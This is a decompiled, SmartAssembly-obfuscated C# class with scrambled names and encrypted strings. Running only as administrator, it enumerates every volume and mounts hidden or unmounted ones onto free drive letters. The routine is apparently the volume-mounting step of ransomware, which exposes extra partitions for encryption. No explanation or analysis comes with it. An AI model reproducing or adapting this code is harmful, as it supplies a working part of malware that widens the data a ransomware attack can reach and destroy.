using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

public static class LJNybARDNBq
{
	public enum zFsLNxoPYeMdtif : uint
	{
		eBzWLYjcgXfse,
		yoXSBQAPWsdG,
		HlKtFYdnScD,
		TAJjLjFCiCQ,
		hFWlGIutVYYYsk,
		JkSGkNJmUM,
		NCkTLmCldSaIfz
	}

	private sealed class qtxNPCNuRBqj
	{
		public uint TlaFawqtxTJx;

		public uint NLrqnPZuZMy;

		public char[] RLGFUbniLDdloWj;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, RLGFUbniLDdloWj, NLrqnPZuZMy, ref TlaFawqtxTJx))
			{
				return RLGFUbniLDdloWj.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern zFsLNxoPYeMdtif GetDriveType([MarshalAs(UnmanagedType.LPStr)] string PwBFmffCPCF);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string OgmAaXmfQfwE, char[] ussNGFPuaBkM, uint txCMxhgbvIDy, ref uint KYGDaZoDdsjFXt);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> WKEkxejMArNakT()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void RydTkWjufdM()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			qtxNPCNuRBqj CS_0024_003C_003E8__locals0 = new qtxNPCNuRBqj();
			string[] array = new string[26]
			{
				getString_0(107402081),
				getString_0(107402076),
				getString_0(107402071),
				getString_0(107402034),
				getString_0(107402029),
				getString_0(107402024),
				getString_0(107402051),
				getString_0(107402046),
				getString_0(107402041),
				getString_0(107402004),
				getString_0(107401999),
				getString_0(107401994),
				getString_0(107402021),
				getString_0(107402016),
				getString_0(107402011),
				getString_0(107402006),
				getString_0(107401969),
				getString_0(107401964),
				getString_0(107401959),
				getString_0(107401986),
				getString_0(107401981),
				getString_0(107401976),
				getString_0(107402451),
				getString_0(107402446),
				getString_0(107402441),
				getString_0(107402468)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == zFsLNxoPYeMdtif.yoXSBQAPWsdG)
				{
					array2[num++] = text;
				}
			}
			List<string> source = WKEkxejMArNakT();
			CS_0024_003C_003E8__locals0.TlaFawqtxTJx = 0u;
			CS_0024_003C_003E8__locals0.NLrqnPZuZMy = 120u;
			CS_0024_003C_003E8__locals0.RLGFUbniLDdloWj = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.RLGFUbniLDdloWj, CS_0024_003C_003E8__locals0.NLrqnPZuZMy, ref CS_0024_003C_003E8__locals0.TlaFawqtxTJx) || CS_0024_003C_003E8__locals0.RLGFUbniLDdloWj.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (RQEwPOshulKqs.DcTmJYuRqmJcpcY)
				{
					try
					{
						Console.WriteLine(getString_0(107402463), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (RQEwPOshulKqs.rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(RQEwPOshulKqs.nPLbuhisBzmHoeaY, getString_0(107402406) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static LJNybARDNBq()
	{
		Strings.CreateGetStringDelegate(typeof(LJNybARDNBq));
	}
}
